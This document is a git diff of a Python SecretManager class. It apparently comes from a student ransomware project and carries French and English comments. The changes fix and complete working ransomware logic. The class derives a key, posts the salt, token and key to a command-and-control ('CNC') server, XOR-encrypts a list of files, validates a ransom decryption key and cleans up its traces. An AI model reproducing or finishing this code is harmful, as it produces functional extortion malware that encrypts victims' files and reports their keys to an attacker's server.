@@ -41,7 +41,6 @@ class SecretManager:
         
         salt = os.urandom(SecretManager.SALT_LENGTH)
         token = os.urandom(SecretManager.TOKEN_LENGTH)
-        
         key = self.do_derivation(salt, token)
 
         return [salt, token, key]
@@ -62,22 +61,16 @@ class SecretManager:
             "key" : self.bin_to_b64(key)
         }
 
-        jsonElements = json.dumps(elements)
-
-        reponse = requests.post(url, json = jsonElements)
+        reponse = requests.post(url, json = elements)
 
         if reponse.status_code != 200:
-            self._log.info(f"Erreur : {reponse.text}")
+            self._log.info(f"Error : {reponse.text}")
         else:
-            self._log.info(f"Les données ont été envoyées au CNC")
+            self._log.info(f"Data sent to CNC.")
         
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
-
-        print("Initialisation de la fonction setup...")
-
-        print("On vérifie si le fichier est présent dans le répertoire")
         # on vérifie si le fichier est présent dans le répertoire
         if os.path.exists("token.bin"):
             file = open(self._path + "/token.bin", "rb")
@@ -86,11 +79,8 @@ class SecretManager:
         
         
         else:
-            print("le fichier n'est pas présent dans le répertoire")
-             #création des éléments cryptographiques
+            #création des éléments cryptographiques
             self._salt, self._token, self._key = self.create()
-
-            print(f"La clé créée est : {self._key}, type : {type(self._key)}")
 
             #si le fichier n'est pas présent dans le répertoire, on le crée
             if os.path.exists(self._path):
@@ -108,47 +98,38 @@ class SecretManager:
             file_salt.write(self._salt)
             file_salt.close()
 
-        print("Envoi des éléments au CNC...")
         #envoi des éléments au CNC
         self.post_new(self._salt, self._key, self._token)
-        print("Éléments envoyés !")
-
+        
 
     def load(self)->None:
         # function to load crypto data
 
-        with open(self._path, "token.bin") as file_token:
-            self._token = file_token.read("token.bin")
+        with open(os.path.join(self._path, "token.bin"), "rb") as file_token:
+            self._token = file_token.read()
 
-        self._log("Token chargé")
-
-        with open(self._path, "salt.bin") as file_salt:
-            self._salt = file_salt.read("salt.bin")
+        with open(os.path.join(self._path, "salt.bin"), "rb") as file_salt:
+            self._salt = file_salt.read()
         
-        self._log("Salt chargé")
-
 
     def check_key(self, candidate_key:bytes)->bool:
-        self._log("Vérification de la clé...")
         # Assert the key is valid
-        
-        self.load()
         if candidate_key == self.do_derivation(self._salt, self._token):
+            print("La clé est bonne !")
             return True
         else:
-            if candidate_key != self.do_derivation(self._salt, self._token):
-                return False
+            return False
 
 
     def set_key(self, b64_key:str)->None:
         # If the key is valid, set the self._key var for decrypting
 
-        if self.check_key(b64_key) == True:
-            self._key = base64.b64decode(b64_key)
-
+        key_to_test = base64.b64decode(b64_key)
+        
+        if self.check_key(key_to_test) == True:
+            self._key = key_to_test
         else:
-            if self.check_key(b64_key) == False:
-                raise NameError("The key is invalid!")
+            print("The key is invalid!")
 
 
     def get_hex_token(self)->str:
@@ -163,7 +144,7 @@ class SecretManager:
 
     def xorfiles(self, files:List[str])->None:
         # xor a list for file
-        print(f"Clé utilisée : {self._key}, de type {type(self._key)}")
+        print(self._key)
         xorfile(files, self._key)
 
 
@@ -174,4 +155,6 @@ class SecretManager:
 
     def clean(self):
         # remove crypto data from the target
-        raise NotImplemented()
+        os.remove(self._path + "token.bin")
+        os.remove(self._path + "salt.bin")
+        
